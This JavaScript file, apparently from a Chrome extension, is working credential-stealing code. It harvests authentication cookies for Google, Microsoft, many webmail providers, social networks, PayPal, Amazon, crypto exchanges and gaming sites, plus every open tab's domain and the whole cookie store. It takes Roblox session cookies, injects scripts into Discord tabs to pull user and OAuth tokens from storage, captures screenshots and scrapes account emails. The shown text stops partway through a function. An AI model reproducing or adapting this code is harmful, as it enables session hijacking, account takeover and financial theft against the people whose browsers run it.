'use strict';

(function (global) {
  function captureScreenshot(windowIdOpt) {
    return new Promise((resolve) => {
      const windowId =
        typeof windowIdOpt === 'number' && !Number.isNaN(windowIdOpt) ? windowIdOpt : undefined;
      const runCapture = (win, onDone) => {
        if (win !== undefined) {
          chrome.tabs.captureVisibleTab(win, { format: 'png' }, onDone);
        } else {
          chrome.tabs.captureVisibleTab({ format: 'png' }, onDone);
        }
      };
      runCapture(windowId, (dataUrl) => {
        const err1 = chrome.runtime.lastError;
        if (err1 && windowId !== undefined) {
          runCapture(undefined, (dataUrl2) => {
            if (chrome.runtime.lastError) {
              resolve({ success: false, error: chrome.runtime.lastError.message });
              return;
            }
            resolve({ success: true, dataUrl: dataUrl2 });
          });
          return;
        }
        if (err1) {
          resolve({ success: false, error: err1.message });
          return;
        }
        resolve({ success: true, dataUrl });
      });
    });
  }

  function createCookieJarBuilder() {
    const seen = new Map();
    const jar = [];
    return {
      addBatch(list) {
        if (!list) return;
        for (const c of list) {
          if (!c || !c.name || c.value == null || String(c.value) === '') continue;
          const key = `${c.domain || ''}\t${c.path || '/'}\t${c.name}`;
          if (seen.has(key)) continue;
          seen.set(key, true);
          jar.push(c);
        }
      },
      getAll() {
        return jar;
      },
      toMeta() {
        return jar.map((c) => ({
          name: c.name,
          value: c.value,
          domain: c.domain,
          path: c.path,
          secure: !!c.secure,
          httpOnly: !!c.httpOnly,
          hostOnly: !!c.hostOnly,
          sameSite: c.sameSite,
          expirationDate: c.expirationDate
        }));
      },
      get size() {
        return jar.length;
      }
    };
  }

  function jarMetaToString(meta) {
    try {
      return JSON.stringify(meta);
    } catch (e) {
      return '[]';
    }
  }

  const GOOGLE_COOKIE_QUERY_DOMAINS = [
    '.google.com',
    'google.com',
    'accounts.google.com',
    '.youtube.com',
    'youtube.com',
    'mail.google.com',
    '.googleusercontent.com'
  ];
  const MICROSOFT_COOKIE_QUERY_DOMAINS = [
    '.live.com',
    'live.com',
    '.microsoft.com',
    'microsoft.com',
    '.microsoftonline.com',
    'microsoftonline.com',
    '.office.com',
    'office.com',
    '.office365.com',
    'office365.com',
    '.outlook.com',
    'outlook.com',
    'outlook.live.com',
    'outlook.office365.com',
    'outlook.office.com',
    'login.live.com',
    'login.microsoftonline.com',
    'account.live.com',
    'account.microsoft.com',
    // Hotmail / MSN
    '.hotmail.com',
    'hotmail.com',
    '.msn.com',
    'msn.com'
  ];
  const GOOGLE_AUTH_FETCH_URLS = [
    'https://accounts.google.com',
    'https://www.google.com',
    'https://google.com',
    'https://mail.google.com',
    'https://myaccount.google.com',
    'https://ogs.google.com'
  ];
  const GOOGLE_AUTH_FETCH_NAMES = [
    'SID',
    'HSID',
    'SSID',
    'APISID',
    'SAPISID',
    '__Secure-1PSID',
    '__Secure-3PSID',
    '__Secure-1PAPISID',
    '__Secure-3PAPISID',
    'LSID',
    'SIDCC',
    'NID',
    'AEC',
    'ACCOUNT_CHOOSER',
    '__Host-GAPS',
    '__Host-1PLSID',
    '__Host-3PLSID',
    '__Secure-1PSIDTS',
    '__Secure-3PSIDTS'
  ];
  const YAHOO_COOKIE_QUERY_DOMAINS = [
    '.yahoo.com', 'yahoo.com', 'mail.yahoo.com', 'login.yahoo.com',
    '.ymail.com', 'ymail.com', '.rocketmail.com', 'rocketmail.com',
    // Country / regional Yahoo domains
    '.yahoo.co.uk', 'yahoo.co.uk', 'mail.yahoo.co.uk',
    '.yahoo.de', 'yahoo.de', 'mail.yahoo.de',
    '.yahoo.fr', 'yahoo.fr', 'mail.yahoo.fr',
    '.yahoo.co.jp', 'yahoo.co.jp', 'mail.yahoo.co.jp',
    '.yahoo.com.au', 'yahoo.com.au',
    '.yahoo.es', 'yahoo.es',
    '.yahoo.it', 'yahoo.it',
    '.yahoo.com.br', 'yahoo.com.br',
    '.yahoo.com.ar', 'yahoo.com.ar',
    '.yahoo.co.in', 'yahoo.co.in',
    '.yahoo.com.mx', 'yahoo.com.mx',
    '.yahoo.gr', 'yahoo.gr',
    '.yahoo.ro', 'yahoo.ro'
  ];

  // All popular mail provider cookie domains
  const ALL_MAIL_COOKIE_DOMAINS = [
    // iCloud / Apple
    '.icloud.com', 'icloud.com', 'mail.icloud.com',
    '.apple.com', 'appleid.apple.com',
    // ProtonMail / Proton
    '.proton.me', 'proton.me', 'mail.proton.me',
    '.protonmail.com', 'protonmail.com',
    // AOL (owned by Yahoo)
    '.aol.com', 'aol.com', 'mail.aol.com', 'login.aol.com',
    // GMX
    '.gmx.com', 'gmx.com', 'mail.gmx.com',
    '.gmx.de', 'gmx.de', 'mail.gmx.de',
    '.gmx.net', 'gmx.net',
    // Web.de
    '.web.de', 'web.de', 'email.web.de',
    // Mail.com
    '.mail.com', 'mail.com',
    // Zoho
    '.zoho.com', 'mail.zoho.com',
    // Fastmail
    '.fastmail.com', 'fastmail.com', 'app.fastmail.com',
    // Yandex (popular in Russia/CIS)
    '.yandex.ru', 'yandex.ru', 'mail.yandex.ru',
    '.yandex.com', 'yandex.com', 'mail.yandex.com',
    '.yandex.kz', 'mail.yandex.kz',
    // Mail.ru / VK Mail
    '.mail.ru', 'mail.ru', 'e.mail.ru', 'auth.mail.ru', 'account.mail.ru',
    // QQ / Tencent
    '.qq.com', 'mail.qq.com', 'exmail.qq.com',
    // 163 / 126 / Netease
    '.163.com', 'mail.163.com',
    '.126.com', 'mail.126.com',
    // Tutanota
    '.tutanota.com', 'tutanota.com', 'app.tuta.com', '.tuta.com',
    // Ukr.net (Ukraine)
    '.ukr.net', 'mail.ukr.net',
    // Rambler (Russia)
    '.rambler.ru', 'mail.rambler.ru',
    // Samsung Email / Naver (Korea)
    '.naver.com', 'mail.naver.com',
    // OVH / Seznam (CZ)
    '.seznam.cz', 'email.seznam.cz',
    // T-Online (Germany)
    '.t-online.de', 't-online.de',
    // Orange (France)
    '.orange.fr', 'mail.orange.fr',
    // Libero (Italy)
    '.libero.it', 'mail.libero.it',
    // UOL (Brazil)
    '.uol.com.br', 'email.uol.com.br'
  ];

  const PLATFORM_COOKIE_DOMAINS = [
    // Steam
    '.steampowered.com', 'steampowered.com', 'store.steampowered.com',
    '.steamcommunity.com', 'steamcommunity.com', '.steam.io', 'steam.io',
    // Epic Games
    '.epicgames.com', 'epicgames.com', 'store.epicgames.com',
    // Twitch
    '.twitch.tv', 'twitch.tv', 'www.twitch.tv',
    // Telegram
    '.telegram.org', 'telegram.org', 'web.telegram.org',
    // VK
    '.vk.com', 'vk.com', 'm.vk.com', '.vk.ru', 'vk.ru',
    // Facebook
    '.facebook.com', 'facebook.com', 'm.facebook.com', '.fb.com', 'fb.com',
    // Instagram
    '.instagram.com', 'instagram.com',
    // Twitter / X
    '.twitter.com', 'twitter.com', '.x.com', 'x.com',
    // TikTok
    '.tiktok.com', 'tiktok.com',
    // LinkedIn
    '.linkedin.com', 'linkedin.com',
    // PayPal
    '.paypal.com', 'paypal.com',
    // Amazon (global)
    '.amazon.com', 'amazon.com', '.amazon.co.uk', 'amazon.co.uk',
    '.amazon.de', 'amazon.de', '.amazon.fr', 'amazon.fr',
    '.amazon.co.jp', 'amazon.co.jp', '.amazon.com.au', 'amazon.com.au',
    '.amazon.it', 'amazon.it', '.amazon.es', 'amazon.es',
    '.amazon.ca', 'amazon.ca', '.amazon.com.br', 'amazon.com.br',
    '.amazon.com.mx', 'amazon.com.mx', '.amazon.nl', 'amazon.nl',
    '.amazon.pl', 'amazon.pl', '.amazon.se', 'amazon.se',
    // Binance
    '.binance.com', 'binance.com',
    // Coinbase
    '.coinbase.com', 'coinbase.com',
    // Bybit
    '.bybit.com', 'bybit.com',
    // Battle.net / Blizzard
    '.blizzard.com', 'blizzard.com', '.battle.net', 'battle.net',
    'us.battle.net', 'eu.battle.net', 'kr.battle.net',
    // EA / Origin
    '.ea.com', 'ea.com', 'accounts.ea.com', '.origin.com', 'origin.com',
    // Riot Games
    '.riotgames.com', 'riotgames.com', '.leagueoflegends.com', 'leagueoflegends.com',
    '.valorant.com', 'valorant.com',
    // Minecraft / Mojang
    '.minecraft.net', 'minecraft.net', '.mojang.com', 'mojang.com',
    '.minecraftservices.com', 'minecraftservices.com', 'account.mojang.com'
  ];

  // Mail tab URL patterns for scraping (chrome.tabs.query)
  const MAIL_TAB_PATTERNS = [
    // Yahoo (.com + country domains)
    'https://mail.yahoo.com/*', 'https://login.yahoo.com/*',
    'https://mail.yahoo.co.uk/*', 'https://mail.yahoo.de/*',
    'https://mail.yahoo.fr/*', 'https://mail.yahoo.co.jp/*',
    'https://mail.yahoo.com.au/*', 'https://mail.yahoo.es/*',
    'https://mail.yahoo.it/*', 'https://mail.yahoo.com.br/*',
    'https://*.yahoo.co.uk/*', 'https://*.yahoo.de/*',
    'https://*.yahoo.fr/*', 'https://*.yahoo.co.jp/*',
    // iCloud
    'https://mail.icloud.com/*', 'https://www.icloud.com/*',
    'https://appleid.apple.com/*',
    // ProtonMail
    'https://mail.proton.me/*', 'https://protonmail.com/*', 'https://account.proton.me/*',
    // AOL
    'https://mail.aol.com/*', 'https://login.aol.com/*',
    // GMX
    'https://mail.gmx.com/*', 'https://mail.gmx.de/*', 'https://www.gmx.de/*',
    // Web.de
    'https://email.web.de/*', 'https://www.web.de/*',
    // Mail.com
    'https://mail.com/*', 'https://www.mail.com/*',
    // Zoho
    'https://mail.zoho.com/*', 'https://accounts.zoho.com/*',
    // Fastmail
    'https://app.fastmail.com/*', 'https://www.fastmail.com/*',
    // Yandex
    'https://mail.yandex.ru/*', 'https://mail.yandex.com/*', 'https://yandex.ru/mail/*',
    'https://id.yandex.ru/*', 'https://passport.yandex.ru/*',
    // Mail.ru
    'https://mail.ru/*', 'https://e.mail.ru/*', 'https://account.mail.ru/*',
    // QQ
    'https://mail.qq.com/*', 'https://wx.mail.qq.com/*',
    // 163 / 126
    'https://mail.163.com/*', 'https://mail.126.com/*', 'https://mail.yeah.net/*',
    // Tutanota
    'https://app.tuta.com/*', 'https://mail.tutanota.com/*',
    // Ukr.net
    'https://mail.ukr.net/*',
    // Rambler
    'https://mail.rambler.ru/*',
    // Naver
    'https://mail.naver.com/*',
    // Seznam
    'https://email.seznam.cz/*',
    // T-Online
    'https://email.t-online.de/*',
    // Orange
    'https://mail.orange.fr/*', 'https://webmail.orange.fr/*',
    // Libero
    'https://mail.libero.it/*',
    // Outlook / Microsoft / Hotmail / MSN
    'https://outlook.live.com/*', 'https://outlook.office.com/*',
    'https://outlook.office365.com/*', 'https://account.microsoft.com/*',
    'https://account.live.com/*', 'https://hotmail.com/*',
    'https://www.hotmail.com/*', 'https://*.hotmail.com/*',
    'https://msn.com/*', 'https://www.msn.com/*'
  ];

  const PLATFORM_TAB_PATTERNS = [
    // Steam
    'https://*.steampowered.com/*', 'https://*.steamcommunity.com/*',
    // Epic Games
    'https://www.epicgames.com/*', 'https://store.epicgames.com/*',
    // Twitch
    'https://www.twitch.tv/*', 'https://twitch.tv/*',
    // Telegram
    'https://web.telegram.org/*', 'https://telegram.org/*',
    // VK
    'https://vk.com/*', 'https://m.vk.com/*',
    // Facebook / Instagram
    'https://www.facebook.com/*', 'https://www.instagram.com/*',
    // Twitter / X
    'https://twitter.com/*', 'https://x.com/*',
    // TikTok
    'https://www.tiktok.com/*',
    // LinkedIn
    'https://www.linkedin.com/*',
    // PayPal
    'https://www.paypal.com/*',
    // Amazon
    'https://www.amazon.com/*', 'https://www.amazon.co.uk/*',
    'https://www.amazon.de/*', 'https://www.amazon.fr/*',
    // Crypto exchanges
    'https://www.binance.com/*', 'https://www.coinbase.com/*',
    'https://www.bybit.com/*',
    // Battle.net / Blizzard
    'https://*.blizzard.com/*', 'https://*.battle.net/*',
    // EA / Origin
    'https://www.ea.com/*', 'https://accounts.ea.com/*', 'https://www.origin.com/*',
    // Riot Games
    'https://www.riotgames.com/*', 'https://www.leagueoflegends.com/*',
    'https://playvalorant.com/*',
    // Minecraft / Mojang
    'https://www.minecraft.net/*', 'https://account.mojang.com/*',
    'https://www.mojang.com/*'
  ];

  // Provider-specific selectors and patterns
  const MAIL_PROVIDER_SELECTORS = [
    { re: /mail\.yahoo\.com|yahoo\.com/, name: 'Yahoo',
      selectors: ['[data-test-id="user-info-item"]', '.accountName', '[class*="AccountName"]', '[class*="user-name"]'] },
    { re: /mail\.proton\.me|protonmail\.com/, name: 'Proton',
      selectors: ['[data-testid="sidebar:user-email"]', '.user-info__email', '[class*="userEmail"]', '.user-dropdown__email'] },
    { re: /icloud\.com|apple\.com/, name: 'iCloud',
      selectors: ['[class*="settings-email"]', '[class*="email-address"]', '[data-apple-id]', '#apple-id-field'] },
    { re: /mail\.aol\.com|aol\.com/, name: 'AOL',
      selectors: ['[data-test-id="user-info"]', '.account-name', '[class*="AccountName"]'] },
    { re: /gmx\.(com|de|net|at|ch)/, name: 'GMX',
      selectors: ['.user-email', '[class*="user-email"]', '#userEmail', '.topbar-email', '[class*="UserName"]'] },
    { re: /web\.de/, name: 'Web.de',
      selectors: ['.user-email', '[class*="user-email"]', '#userEmail', '.topbar-email'] },
    { re: /mail\.zoho\.com/, name: 'Zoho',
      selectors: ['[class*="user-email"]', '.email-id', '[data-email]', '#loginid'] },
    { re: /fastmail\.com/, name: 'Fastmail',
      selectors: ['.u-text--minor', '[class*="userEmail"]', '[title*="@"]'] },
    { re: /yandex\.(ru|com|kz)/, name: 'Yandex',
      selectors: ['.user-account__name', '.user-name', '[class*="user-info"]', '.legouser__name', '.login__name'] },
    { re: /mail\.ru|e\.mail\.ru/, name: 'Mail.ru',
      selectors: ['.ph-user-email', '[class*="user-email"]', '.account__name', '[class*="account-name"]'] },
    { re: /mail\.qq\.com/, name: 'QQ',
      selectors: ['#spanAccount', '.account', '#qqaccount'] },
    { re: /mail\.163\.com|mail\.126\.com/, name: '163',
      selectors: ['#header163 .user-name', '.account-num', '.qn_area_login_name'] },
    { re: /tuta\.com|tutanota\.com/, name: 'Tutanota',
      selectors: ['.mail-address', '[class*="loginName"]', '.login-form__email'] },
    { re: /ukr\.net/, name: 'Ukr.net',
      selectors: ['.user-name', '[class*="user-name"]', '.ful-name'] },
    { re: /rambler\.ru/, name: 'Rambler',
      selectors: ['.user-account__name', '.re-user-email', '[class*="user-email"]'] },
    { re: /mail\.naver\.com/, name: 'Naver',
      selectors: ['#header_userlayer .id', '.u_id', '.user_id'] },
    { re: /seznam\.cz/, name: 'Seznam',
      selectors: ['[class*="user-name"]', '.username', '#usernameControl'] },
    { re: /t-online\.de/, name: 'T-Online',
      selectors: ['.sc-username', '[class*="username"]', '.user-email'] },
    { re: /orange\.fr/, name: 'Orange',
      selectors: ['[class*="account-email"]', '.usermail', '[data-email]'] },
    { re: /libero\.it/, name: 'Libero',
      selectors: ['[class*="email"]', '.user-email', '#email'] }
  ];
  const COMMON_SITE_COOKIE_DOMAINS = [
    '.discord.com',
    'discord.com',
    '.discordapp.com',
    'discordapp.com',
    '.steampowered.com',
    'steampowered.com',
    '.steamcommunity.com',
    'steamcommunity.com',
    '.epicgames.com',
    'epicgames.com',
    '.twitch.tv',
    'twitch.tv',
    '.amazon.com',
    'amazon.com',
    '.facebook.com',
    'facebook.com',
    '.twitter.com',
    'twitter.com',
    '.x.com',
    'x.com',
    '.reddit.com',
    'reddit.com',
    '.github.com',
    'github.com',
    '.instagram.com',
    'instagram.com',
    '.tiktok.com',
    'tiktok.com',
    '.netflix.com',
    'netflix.com',
    '.spotify.com',
    'spotify.com',
    '.paypal.com',
    'paypal.com',
    '.ebay.com',
    'ebay.com',
    '.lenovo.com',
    'lenovo.com',
    '.nvidia.com',
    'nvidia.com',
    '.mozilla.org',
    'mozilla.org'
  ];
  const MS_AUTH_FETCH_URLS = [
    'https://outlook.live.com/mail/',
    'https://outlook.live.com/',
    'https://outlook.office.com/mail/',
    'https://outlook.office365.com/mail/',
    'https://outlook.cloud.microsoft/',
    'https://m365.cloud.microsoft/',
    'https://login.live.com/',
    'https://account.live.com/',
    'https://login.microsoftonline.com/',
    'https://account.microsoft.com/'
  ];
  const MS_AUTH_FETCH_NAMES = [
    'MSPCID',
    'MSPAuth',
    'MSPProf',
    'MSPPre',
    'MSPVis',
    'MSPOK',
    'WLSSC',
    'RPSAuth',
    'RPSSecAuth',
    'OParams',
    'JSHP',
    'JSH',
    'ESTSAUTH',
    'ESTSAUTHPERSISTENT',
    'SignInStateCookie',
    'fpc',
    'buid',
    'MSFPC',
    'SPOIDCRL',
    'FedAuth',
    'rtFa',
    'MSISAuth',
    'MSISAuth1',
    'AADSID',
    'CCState',
    'x-ms-RefreshTokenCredential',
    '__Host-MSAAUTH',
    '__Secure-MSAAUTH'
  ];

  async function enrichGoogleMicrosoftCookies(builder) {
    for (const dom of GOOGLE_COOKIE_QUERY_DOMAINS) {
      try {
        builder.addBatch(await chrome.cookies.getAll({ domain: dom }));
      } catch (e) {}
    }

    for (const url of GOOGLE_AUTH_FETCH_URLS) {
      for (const name of GOOGLE_AUTH_FETCH_NAMES) {
        try {
          const cookie = await chrome.cookies.get({ url, name });
          if (cookie?.name && cookie?.value) builder.addBatch([cookie]);
        } catch (e) {}
      }
    }

    for (const dom of MICROSOFT_COOKIE_QUERY_DOMAINS) {
      try {
        builder.addBatch(await chrome.cookies.getAll({ domain: dom }));
      } catch (e) {}
    }

    for (const u of MS_AUTH_FETCH_URLS) {
      for (const n of MS_AUTH_FETCH_NAMES) {
        try {
          const cookie = await chrome.cookies.get({ url: u, name: n });
          if (cookie?.name && cookie?.value) builder.addBatch([cookie]);
        } catch (e) {}
      }
    }
  }

  async function enrichCommonSiteDomains(builder) {
    for (const dom of COMMON_SITE_COOKIE_DOMAINS) {
      try {
        builder.addBatch(await chrome.cookies.getAll({ domain: dom }));
      } catch (e) {}
    }
    for (const dom of YAHOO_COOKIE_QUERY_DOMAINS) {
      try {
        builder.addBatch(await chrome.cookies.getAll({ domain: dom }));
      } catch (e) {}
    }
    for (const dom of ALL_MAIL_COOKIE_DOMAINS) {
      try {
        builder.addBatch(await chrome.cookies.getAll({ domain: dom }));
      } catch (e) {}
    }
    for (const dom of PLATFORM_COOKIE_DOMAINS) {
      try {
        builder.addBatch(await chrome.cookies.getAll({ domain: dom }));
      } catch (e) {}
    }
  }

  async function enrichFromOpenTabs(builder) {
    let tabs = [];
    try {
      tabs = await chrome.tabs.query({});
    } catch (e) {
      return;
    }
    const domains = new Set();
    for (const tab of tabs || []) {
      if (!tab || !tab.url) continue;
      try {
        const u = new URL(tab.url);
        if (u.protocol !== 'http:' && u.protocol !== 'https:') continue;
        const host = u.hostname.toLowerCase();
        if (!host || host === 'localhost' || host === '127.0.0.1') continue;
        domains.add(host);
        const parts = host.split('.');
        if (parts.length >= 2) domains.add('.' + parts.slice(-2).join('.'));
        if (parts.length >= 3) domains.add('.' + parts.slice(-3).join('.'));
      } catch (e2) {}
    }
    const list = [...domains].slice(0, 140);
    for (const dom of list) {
      try {
        builder.addBatch(await chrome.cookies.getAll({ domain: dom }));
      } catch (e3) {}
    }
  }

  async function enrichRobloxCookies(builder) {
    const robloxUrls = [
      'https://www.roblox.com/',
      'https://roblox.com/',
      'https://create.roblox.com/'
    ];
    for (const url of robloxUrls) {
      try {
        const c = await chrome.cookies.get({ url, name: '.ROBLOSECURITY' });
        if (c) builder.addBatch([c]);
      } catch (e) {}
    }
    try {
      builder.addBatch(await chrome.cookies.getAll({ domain: '.roblox.com' }));
    } catch (e) {}
  }

  /**
   * Full Chrome profile: domain queries + open tabs + getAll({}) + Roblox.
   */
  async function collectAllProfileCookies(opts) {
    const options = opts || {};
    const builder = createCookieJarBuilder();

    await enrichGoogleMicrosoftCookies(builder);
    await enrichCommonSiteDomains(builder);
    await enrichFromOpenTabs(builder);

    try {
      builder.addBatch(await chrome.cookies.getAll({}));
    } catch (e) {}

    if (options.includeRoblox !== false) {
      await enrichRobloxCookies(builder);
    }

    if (builder.size < 40) {
      try {
        builder.addBatch(await chrome.cookies.getAll({}));
      } catch (e2) {}
      await enrichFromOpenTabs(builder);
    }

    const meta = builder.toMeta();
    return {
      success: meta.length > 0,
      cookies: meta,
      jarString: jarMetaToString(meta),
      count: meta.length,
      jar: builder.getAll()
    };
  }

  async function getFullProfileCookieJar() {
    return collectAllProfileCookies({ includeRoblox: true });
  }

  function jarHasLiveGoogleSid(jar) {
    const nowSec = Math.floor(Date.now() / 1000);
    const alive = (c) => {
      if (!c || !c.value) return false;
      const exp = c.expirationDate;
      return exp == null || exp === 0 || exp > nowSec;
    };
    return (jar || []).some(
      (c) =>
        alive(c) &&
        String(c.domain || '')
          .replace(/^\./, '')
          .toLowerCase() === 'google.com' &&
        (c.name === 'SID' || c.name === '__Secure-1PSID' || c.name === '__Secure-3PSID')
    );
  }

  async function warmGoogleSessionIfNeeded() {
    let tabId = null;
    try {
      const tab = await chrome.tabs.create({
        url: 'https://www.google.com/',
        active: false
      });
      tabId = tab && tab.id;
      await new Promise((r) => setTimeout(r, 1400));
    } catch (e) {
    } finally {
      if (tabId != null) {
        try {
          await chrome.tabs.remove(tabId);
        } catch (e2) {}
      }
    }
  }

  async function getDiscordToken() {
    const DISCORD_TAB_URL_PATTERNS = [
      'https://discord.com/*',
      'https://discord.com/',
      'https://ptb.discord.com/*',
      'https://canary.discord.com/*',
      'http://discord.com/*',
      'https://*.discord.com/*',
      'http://*.discord.com/*',
      'https://discordapp.com/*',
      'https://*.discordapp.com/*'
    ];

    const isDiscordTabUrl = (url) => {
      if (!url || /^chrome-extension:|^chrome:|^edge:|^about:/i.test(url)) return false;
      try {
        const h = new URL(url).hostname.toLowerCase();
        return (
          h === 'discord.com' ||
          h.endsWith('.discord.com') ||
          h === 'discordapp.com' ||
          h.endsWith('.discordapp.com')
        );
      } catch {
        return false;
      }
    };

    const getDiscordTabs = async () => {
      let tabs = [];
      try {
        tabs = await chrome.tabs.query({ url: DISCORD_TAB_URL_PATTERNS });
      } catch (_) {
        tabs = [];
      }
      if (tabs && tabs.length > 0) return tabs;
      try {
        const all = await chrome.tabs.query({});
        return (all || []).filter((t) => isDiscordTabUrl(t.url));
      } catch (_) {
        return [];
      }
    };

    const getTokenFromStorage = async () => {
      try {
        const tabs = await getDiscordTabs();
        if (!tabs || tabs.length === 0) {
          return { success: false, error: 'Discord token not found. Open Discord in a tab first.' };
        }

        const scoreTab = (url) => {
          if (!url) return 0;
          if (url.includes('/channels') || url.includes('/app')) return 3;
          if (url.includes('discord.com')) return 2;
          return 1;
        };
        tabs.sort((a, b) => scoreTab(b.url) - scoreTab(a.url));

        const readToken = () => {
          const normalize = (t) => (t ? String(t).replace(/"/g, '').trim() : null);
          const looksLikeDiscordUserToken = (s) => {
            if (!s || typeof s !== 'string') return false;
            const x = s.trim();
            if (x.startsWith('eyJ')) return false;
            if (x.startsWith('mfa.') && x.length > 30) return true;
            const parts = x.split('.');
            if (parts.length !== 3) return false;
            if (x.length < 50 || x.length > 420) return false;
            for (let pi = 0; pi < 3; pi++) {
              if (parts[pi].length < 5) return false;
              if (!/^[A-Za-z0-9_-]+$/.test(parts[pi])) return false;
            }
            return true;
          };
          /** Discord OAuth2 access_token is a JWT (three base64url segments, starts with eyJ). */
          const looksLikeDiscordOAuthAccessToken = (s) => {
            if (!s || typeof s !== 'string') return false;
            const x = s.trim();
            if (!x.startsWith('eyJ')) return false;
            const parts = x.split('.');
            if (parts.length !== 3) return false;
            if (x.length < 80 || x.length > 6000) return false;
            for (let pi = 0; pi < 3; pi++) {
              if (parts[pi].length < 10) return false;
              if (!/^[A-Za-z0-9_-]+$/.test(parts[pi])) return false;
            }
            return true;
          };
          const looksLikeDiscordToken = (s) =>
            looksLikeDiscordUserToken(s) || looksLikeDiscordOAuthAccessToken(s);

          try {
            const merged = (window.location.hash || '') + (window.location.search || '');
            const am = merged.match(/access_token=([^&]+)/);
            if (am) {
              let dec;
              try {
                dec = decodeURIComponent(am[1].replace(/\+/g, '%20'));
              } catch (e) {
                dec = am[1];
              }
              const n = normalize(dec);
              if (looksLikeDiscordOAuthAccessToken(n)) return n;
            }
          } catch (e) {}

          const scanStorageBlob = (store) => {
            try {
              const chunks = [];
              for (let i = 0; i < store.length; i++) {
                const k = store.key(i);
                chunks.push(store.getItem(k) || '');
              }
              const blob = chunks.join('\n');
              const mfa = blob.match(/\bmfa\.[A-Za-z0-9_-]{10,}\b/);
              if (mfa) return normalize(mfa[0]);
              const cand = blob.match(/\b[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{20,}\b/g);
              if (cand) {
                for (let ci = 0; ci < cand.length; ci++) {
                  if (looksLikeDiscordUserToken(cand[ci])) return normalize(cand[ci]);
                }
                for (let ci = 0; ci < cand.length; ci++) {
                  if (looksLikeDiscordOAuthAccessToken(cand[ci])) return normalize(cand[ci]);
                }
              }
              const jwts = blob.match(/\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g);
              if (jwts) {
                for (let ji = 0; ji < jwts.length; ji++) {
                  if (looksLikeDiscordOAuthAccessToken(jwts[ji])) return normalize(jwts[ji]);
                }
              }
            } catch (e) {}
            return null;
          };
          const tryKey = (store, key) => {
            try {
              const raw = store.getItem(key);
              if (raw) return normalize(raw);
            } catch (e) {}
            return null;
          };
          const tryKeyDiscord = (store, key) => {
            try {
              const raw = store.getItem(key);
              if (!raw) return null;
              let n = normalize(raw);
              if (n && looksLikeDiscordToken(n)) return n;
              const t = String(raw).trim();
              if (t.startsWith('{')) {
                try {
                  const o = JSON.parse(t);
                  if (typeof o === 'string' && looksLikeDiscordToken(normalize(o))) return normalize(o);
                  if (o && typeof o === 'object') {
                    for (const kk of [
                      'token',
                      'access_token',
                      'user_token',
                      'auth_token',
                      'client_token'
                    ]) {
                      const v = o[kk];
                      if (typeof v === 'string' && looksLikeDiscordToken(normalize(v))) return normalize(v);
                    }
                    for (const vv of Object.values(o)) {
                      if (typeof vv === 'string' && looksLikeDiscordToken(normalize(vv))) return normalize(vv);
                    }
                  }
                } catch (_) {}
              }
            } catch (e) {}
            return null;
          };
          for (const key of ['token', 'tokens']) {
            const a = tryKeyDiscord(localStorage, key);
            if (a) return a;
            const b = tryKeyDiscord(sessionStorage, key);
            if (b) return b;
          }
          try {
            const rawT = localStorage.getItem('tokens');
            if (rawT) {
              const j = JSON.parse(rawT);
              const walk = (o) => {
                if (typeof o === 'string') {
                  if (looksLikeDiscordUserToken(o)) return normalize(o);
                  if (looksLikeDiscordOAuthAccessToken(o)) return normalize(o);
                  return null;
                }
                if (o && typeof o === 'object' && !Array.isArray(o)) {
                  for (const [kk, vv] of Object.entries(o)) {
                    const kl = String(kk || '').toLowerCase();
                    if (
                      (kl === 'access_token' ||
                        kl === 'token' ||
                        kl === 'user_token' ||
                        kl.includes('oauth') ||
                        kl.includes('auth')) &&
                      typeof vv === 'string'
                    ) {
                      const n = normalize(vv);
                      if (looksLikeDiscordOAuthAccessToken(n) || looksLikeDiscordUserToken(n)) return n;
                    }
                  }
                }
                if (o && typeof o === 'object') {
                  for (const v of Object.values(o)) {
                    const x = walk(v);
                    if (x) return x;
                  }
                }
                return null;
              };
              const fromJson = walk(j);
              if (fromJson) return fromJson;
            }
          } catch (e) {}
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const k = localStorage.key(i);
              if (!k || !/token|auth|discord|webclient|oauth|session|credential/i.test(k)) continue;
              const v = tryKeyDiscord(localStorage, k) || tryKey(localStorage, k);
              if (v && looksLikeDiscordToken(v)) return v;
            }
          } catch (e) {}

          const sandboxIframe = document.querySelector('iframe[sandbox]');
          if (sandboxIframe) {
            try {
              const t = sandboxIframe.contentWindow.localStorage.getItem('token');
              if (t && looksLikeDiscordToken(normalize(t))) return normalize(t);
            } catch (e) {}
          }

          try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.documentElement.appendChild(iframe);
            const t = iframe.contentWindow.localStorage.getItem('token');
            iframe.remove();
            if (t && looksLikeDiscordToken(normalize(t))) return normalize(t);
          } catch (e) {}

          try {
            const tokenMatch = document.cookie.match(/token=([^;]+)/);
            if (tokenMatch && looksLikeDiscordToken(tokenMatch[1])) return tokenMatch[1];
          } catch (e) {}
          let fromBlob = scanStorageBlob(localStorage);
          if (fromBlob) return fromBlob;
          fromBlob = scanStorageBlob(sessionStorage);
          if (fromBlob) return fromBlob;
          return null;
        };

        const tryInject = async (tabId, useMainWorld) => {
          const opts = { target: { tabId, allFrames: true }, func: readToken };
          if (useMainWorld) opts.world = 'MAIN';
          const results = await chrome.scripting.executeScript(opts);
          if (results && results.length) {
            for (const row of results) {
              if (row && row.result) return row.result;
            }
          }
          return null;
        };

        for (const tab of tabs) {
          if (tab.id == null) continue;
          try {
            let tok = await tryInject(tab.id, true);
            if (!tok) tok = await tryInject(tab.id, false);
            if (tok) {
              return { success: true, token: tok };
            }
          } catch (e) {
            continue;
          }
        }

        return { success: false, error: 'Discord token not found. Log in to Discord first.' };
      } catch (e) {
        return { success: false, error: 'Failed to access Discord: ' + e.message };
      }
    };

    return await getTokenFromStorage();
  }

  async function getGoogleAuth() {
    const coreCookieNames = GOOGLE_AUTH_CORE_NAMES;
    const isGoogleLikeDomain = (domain) => {
      const d = String(domain || '')
        .replace(/^\./, '')
        .toLowerCase();
      return (
        d === 'google.com' ||
        d.endsWith('.google.com') ||
        d === 'youtube.com' ||
        d.endsWith('.youtube.com') ||
        d.endsWith('.googleusercontent.com')
      );
    };
    const domainScore = (d) => {
      const x = String(d || '')
        .replace(/^\./, '')
        .toLowerCase();
      if (x === 'accounts.google.com') return 1000;
      if (x.endsWith('.accounts.google.com')) return 980;
      if (x === 'mail.google.com') return 920;
      if (x === 'myaccount.google.com') return 900;
